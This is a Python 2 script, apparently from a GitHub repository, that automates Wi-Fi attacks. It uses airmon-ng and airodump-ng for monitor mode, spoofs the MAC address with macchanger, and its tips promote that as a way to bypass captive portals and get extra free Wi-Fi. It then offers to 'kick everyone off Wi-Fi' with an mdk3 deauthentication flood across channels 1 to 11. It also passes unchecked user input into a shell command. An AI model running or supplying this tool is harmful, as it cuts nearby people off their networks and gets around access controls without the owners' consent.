#!/usr/bin/env python
'''
This script automates spoofing of mac address
source: github.com/glennlopez
'''

# LIBRARIES
import subprocess			# Subprocess for Shell CMD
import os 					# OS Library

# COLOR LIBRARY
class colors:
    PURPL = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Function for calling shell scripts within python script
def cmd(cmd):
	os.system(cmd)


cmd('clear')
print colors.BOLD + 'Starting Monitor mode...' + colors.WHITE
print colors.YELLOW + '[..] be patient, this will take some time' + colors.WHITE
cmd('sleep 2')
cmd('ifconfig wlan0 up')
cmd('airmon-ng start wlan0')
cmd('clear')
print colors.GREEN+ '[..] PRESS [CTRL] + [C] to stop Monitor Mode' + colors.WHITE
print 
print colors.BOLD+'[PROTIP]'+colors.WHITE
print '- Wait till you get enough frames.'
print '- Spoof your Mac Address to bypass captive portals.'
print '- Change your Mac Address to gain extra complimentary Wi-Fi'
cmd('sleep 4')
cmd('airodump-ng mon0')

#open new terminal window with specific monitor
#mon_ap = raw_input(colors.PURPL+'Target Station BSSID Mac Address: '+colors.WHITE)
#cmd('gnome-terminal -e sh -c "airmon-ng --bssid "+mon_ap+"; bash"')

print colors.YELLOW+'[+] wlan0 and mon0 are now off (Wi-Fi is down)'+colors.WHITE
cmd('ifconfig wlan0 down')
cmd('ifconfig mon0 down')
mac = raw_input(colors.RED+'[?] Change MAC Address to: '+colors.WHITE)
cmd('macchanger -m '+mac+' wlan0')
print colors.YELLOW+'[+] Wi-Fi turned back on'+colors.WHITE
cmd('sleep 2.5')
cmd('ifconfig wlan0 up')
cmd('ifconfig | grep wlan0')
print colors.GREEN+'[!] All Done - New mac address should be %s' %(mac)+colors.WHITE
jam = raw_input(colors.RED+'[?] Would you like to kick everyone off Wi-Fi (yes/no): '+colors.WHITE)
if jam == 'yes':
	print colors.YELLOW+'[+] Opening new terminal window for deAuth attack...'
	print '		... press [CTRL]+[C] twice when you want to stop the attack'+colors.WHITE
	#cmd('airmon-ng start wlan0')
	cmd('gnome-terminal -e "mdk3 mon0 d -c 1,2,3,4,5,6,7,8,9,10,11" & gnome-terminal -e "airodump-ng mon0"')
	cmd('ifconfig wlan0 down')
	#cmd('sleep 1.5')
	cmd('ifconfig wlan0 up')
	print colors.YELLOW+'[+] Script is done running...'+colors.WHITE
else:
	print colors.YELLOW+'[+] Script is done running...'+colors.WHITE